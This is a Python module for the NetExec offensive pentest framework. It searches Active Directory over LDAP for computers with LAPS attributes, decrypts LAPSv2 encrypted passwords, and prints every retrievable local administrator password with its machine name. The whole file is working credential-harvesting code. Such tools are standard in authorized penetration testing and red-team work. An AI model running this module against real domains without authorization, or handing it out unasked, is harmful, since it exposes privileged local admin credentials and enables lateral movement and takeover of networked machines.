import json

from impacket.ldap import ldapasn1 as ldapasn1_impacket
from nxc.protocols.ldap.laps import LAPSv2Extract


class NXCModule:
    """
    Module by technobro refactored by @mpgn (now compatible with LDAP protocol + filter by computer)

    Initial module:
    @T3KX: https://github.com/T3KX/Crackmapexec-LAPS

    Credit: @mpgn_x64, @n00py1
    """

    name = "laps"
    description = "Retrieves all LAPS passwords which the account has read permissions for."
    supported_protocols = ["ldap"]
    opsec_safe = True
    multiple_hosts = False

    def options(self, context, module_options):
        """COMPUTER    Computer name or wildcard ex: WIN-S10, WIN-* etc. Default: *"""
        self.computer = None
        if "COMPUTER" in module_options:
            self.computer = module_options["COMPUTER"]

    def on_login(self, context, connection):
        context.log.display("Getting LAPS Passwords")
        searchFilter = "(&(objectCategory=computer)(|(msLAPS-EncryptedPassword=*)(ms-MCS-AdmPwd=*)(msLAPS-Password=*))(name=" + self.computer + "))" if self.computer is not None else "(&(objectCategory=computer)(|(msLAPS-EncryptedPassword=*)(ms-MCS-AdmPwd=*)(msLAPS-Password=*)))"
        attributes = [
            "msLAPS-EncryptedPassword",
            "msLAPS-Password",
            "ms-MCS-AdmPwd",
            "sAMAccountName",
        ]
        results = connection.search(searchFilter, attributes, 0)
        results = [r for r in results if isinstance(r, ldapasn1_impacket.SearchResultEntry)]
        if len(results) != 0:
            laps_computers = []
            for computer in results:
                msMCSAdmPwd = ""
                sAMAccountName = ""
                values = {str(attr["type"]).lower(): attr["vals"][0] for attr in computer["attributes"]}
                if "mslaps-encryptedpassword" in values:
                    msMCSAdmPwd = values["mslaps-encryptedpassword"]
                    d = LAPSv2Extract(bytes(msMCSAdmPwd), connection.username if connection.username else "", connection.password if connection.password else "", connection.domain, connection.nthash if connection.nthash else "", connection.kerberos, connection.kdcHost, 339, connection.dns_server)
                    try:
                        data = d.run()
                    except Exception as e:
                        context.log.fail(str(e))
                        continue
                    r = json.loads(data)
                    laps_computers.append((str(values["samaccountname"]), r["n"], str(r["p"])))
                elif "mslaps-password" in values:
                    r = json.loads(str(values["mslaps-password"]))
                    laps_computers.append((str(values["samaccountname"]), r["n"], str(r["p"])))
                elif "ms-mcs-admpwd" in values:
                    laps_computers.append((str(values["samaccountname"]), "", str(values["ms-mcs-admpwd"])))
                else:
                    context.log.fail("No result found with attribute ms-MCS-AdmPwd or msLAPS-Password")

            laps_computers = sorted(laps_computers, key=lambda x: x[0])
            for sAMAccountName, user, password in laps_computers:
                context.log.highlight(f"Computer:{sAMAccountName} User:{user:<15} Password:{password}")
        else:
            context.log.fail("No result found with attribute ms-MCS-AdmPwd or msLAPS-Password !")
